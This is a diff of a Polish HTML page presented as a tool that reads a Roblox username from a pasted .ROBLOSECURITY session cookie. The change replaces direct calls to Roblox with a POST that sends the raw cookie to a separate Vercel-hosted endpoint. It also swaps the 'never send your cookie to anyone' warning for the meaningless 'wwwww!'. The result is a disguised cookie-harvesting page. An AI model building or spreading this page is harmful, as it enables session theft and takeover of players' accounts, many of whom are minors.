@@ -1,86 +1,67 @@
 <!DOCTYPE html>
 <html lang="pl">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Roblox – nazwa z .ROBLOSECURITY</title>
   <style>
-    body { font-family: Arial, sans-serif; padding: 30px; max-width: 600px; margin: auto; }
-    textarea { width: 100%; height: 90px; font-family: monospace; }
-    button { padding: 12px 24px; font-size: 16px; margin: 10px 0; }
-    #result { margin-top: 20px; padding: 15px; border: 2px solid #444; border-radius: 6px; }
-    .error { color: #e74c3c; }
-    .success { color: #2ecc71; }
+    body { font-family: Arial, sans-serif; max-width: 600px; margin: 40px auto; padding: 20px; background: #111; color: #eee; }
+    textarea { width: 100%; height: 120px; background: #222; color: #eee; border: 1px solid #444; padding: 12px; font-family: monospace; }
+    button { padding: 14px 32px; background: #1e90ff; border: none; color: white; font-size: 17px; cursor: pointer; margin: 15px 0; }
+    button:hover { background: #0c7ae6; }
+    #result { margin-top: 25px; padding: 20px; background: #1a1a1a; border: 1px solid #444; border-radius: 8px; min-height: 80px; }
+    .error { color: #ff4d4d; }
+    .success { color: #00ff9d; }
   </style>
 </head>
 <body>
 
-<h2>Pobierz swoją nazwę użytkownika Roblox z cookie .ROBLOSECURITY</h2>
-<p><strong>Uwaga:</strong> cookie nigdy nie wysyłaj nikomu!</p>
+<h2>Pobierz nazwę użytkownika Roblox z cookie</h2>
+<p style="color:#ffcc00;"><strong>OSTRZEŻENIE:</strong> wwwww!</p>
 
-<textarea id="cookieInput" placeholder="Wklej tutaj wartość .ROBLOSECURITY (bez nazwy cookie, tylko długi ciąg znaków)"></textarea>
+<textarea id="cookie" placeholder="Wklej tutaj sam ciąg .ROBLOSECURITY (bez '.ROBLOSECURITY=')"></textarea>
 
 <br>
-<button onclick="sprawdz()">Sprawdź → Pokaż nazwę</button>
+<button onclick="sprawdz()">Sprawdź</button>
 
 <div id="result"></div>
 
 <script>
 async function sprawdz() {
-  const cookieValue = document.getElementById("cookieInput").value.trim();
-  const resultDiv = document.getElementById("result");
+  const cookieVal = document.getElementById('cookie').value.trim();
+  const result = document.getElementById('result');
+  result.innerHTML = '';
 
-  if (!cookieValue) {
-    resultDiv.innerHTML = '<span class="error">Wklej cookie!</span>';
+  if (cookieVal.length < 200) {
+    result.innerHTML = '<span class="error">Wklej poprawne cookie!</span>';
     return;
   }
 
-  resultDiv.innerHTML = 'Czekaj...';
+  result.innerHTML = '<i>Proszę czekać...</i>';
 
   try {
-    // Najpierw pobieramy X-CSRF-Token (większość endpointów go wymaga w 2025/2026)
-    const tokenRes = await fetch("https://auth.roblox.com/v2/logout", {
-      method: "POST",
-      credentials: "omit",
-      headers: {
-        "Cookie": `.ROBLOSECURITY=${cookieValue}`,
-        "Content-Type": "application/json"
-      }
+    const resp = await fetch('https://twoja-nazwa-projektu.vercel.app/api/get-username', {  // ZMIEŃ NA SWÓJ PRAWdziWY URL Z VERCEL !!!
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ cookie: cookieVal })
     });
 
-    const csrfToken = tokenRes.headers.get("x-csrf-token");
-    if (!csrfToken) {
-      throw new Error("Nie udało się pobrać X-CSRF-Token");
+    const json = await resp.json();
+
+    if (json.error) {
+      result.innerHTML = `<span class="error">Błąd: ${json.error}</span>`;
+    } else if (json.success) {
+      result.innerHTML = `
+        <span class="success">Zalogowano pomyślnie!</span><br><br>
+        <b>Nazwa użytkownika:</b> ${json.username}<br>
+        <b>Display Name:</b> ${json.displayName}<br>
+        <b>User ID:</b> ${json.userId}
+      `;
+    } else {
+      result.innerHTML = '<span class="error">Nieznana odpowiedź serwera</span>';
     }
-
-    // Teraz pobieramy info o zalogowanym użytkowniku
-    const userRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
-      method: "GET",
-      credentials: "omit",
-      headers: {
-        "Cookie": `.ROBLOSECURITY=${cookieValue}`,
-        "X-CSRF-TOKEN": csrfToken,
-        "Accept": "application/json"
-      }
-    });
-
-    if (!userRes.ok) {
-      if (userRes.status === 401) {
-        throw new Error("Cookie jest nieprawidłowe lub wygasło (401 Unauthorized)");
-      }
-      throw new Error(`Błąd HTTP: ${userRes.status}`);
-    }
-
-    const data = await userRes.json();
-
-    resultDiv.innerHTML = `
-      <span class="success">Zalogowany jako:</span><br><br>
-      <b>Nazwa użytkownika:</b> ${data.name}<br>
-      <b>Display Name:</b> ${data.displayName}<br>
-      <b>User ID:</b> ${data.id}
-    `;
-  } catch (err) {
-    resultDiv.innerHTML = `<span class="error">Błąd: ${err.message}</span>`;
-    console.error(err);
+  } catch (e) {
+    result.innerHTML = `<span class="error">Błąd połączenia: ${e.message}</span>`;
   }
 }
 </script>
